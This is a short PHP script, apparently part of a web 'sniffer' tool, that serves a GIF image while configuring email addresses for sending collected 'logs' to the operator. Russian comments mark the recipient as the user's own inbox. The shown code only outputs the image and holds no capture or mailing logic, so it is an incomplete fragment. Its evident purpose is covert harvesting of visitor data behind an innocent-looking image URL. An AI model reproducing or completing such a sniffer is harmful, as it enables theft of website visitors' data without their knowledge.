<? 
header("Content-type: image/gif"); 
$image = imagecreatefromgif("i.gif"); 
$email_send = true;       /// true-on false-off     
$email_from = "sniffer@ya.ru";   /// От кого будут идти логи.    
$email_to = "sniffmy17@mail.ru";   /// Куда будут одти логи (Ваш email)  
imagegif($image); 
imagedestroy($image); 
?>